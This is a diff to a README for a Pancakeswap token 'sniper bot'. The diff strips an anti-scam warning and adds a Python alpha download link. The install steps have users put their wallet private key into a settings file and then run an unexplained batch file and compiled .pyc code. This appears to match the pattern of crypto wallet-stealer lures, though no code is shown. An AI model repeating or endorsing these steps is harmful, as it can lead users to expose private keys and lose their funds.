@@ -4,15 +4,23 @@ Sniper bot, it buys any BSC token that has been newly listed on for Pancakeswap 
 
 
 🚀 Features
+
 💌 Auto approve
+
 ⏰ Buy early token gems with custom gas fee, slippage, amount. (DYOR)
+
 🌏 Sell tokens with your custom increase in price, like 50%, 100%, 200%.
+
 💸 Open source, with free node services (Literally don't have to pay anything to run this bot)
+
 Enjoy and leave a star, if you like it!
-Note: Please install a code visual tool first such as Visual Studio Code as it will help you set up this bot within 4 minutes Please do not use sniping bots that offer .exe files as these are 99% scams
+
+
 
 📦 Install
 1. Download python3.12 for your PC from python org, extract the ABI and themes zip into the folder with the bot
+Link for download python: https://www.python.org/downloads/release/python-3120a1/
+
 2. Open "setting.txt" (with notepad for instance) and add your ethereum/bsc address and private key, contract address for snipping & config your bot.
 3. Run "launchbot.bat" OR type "py sniper.pyc"
 4. Good luck with profits guys!
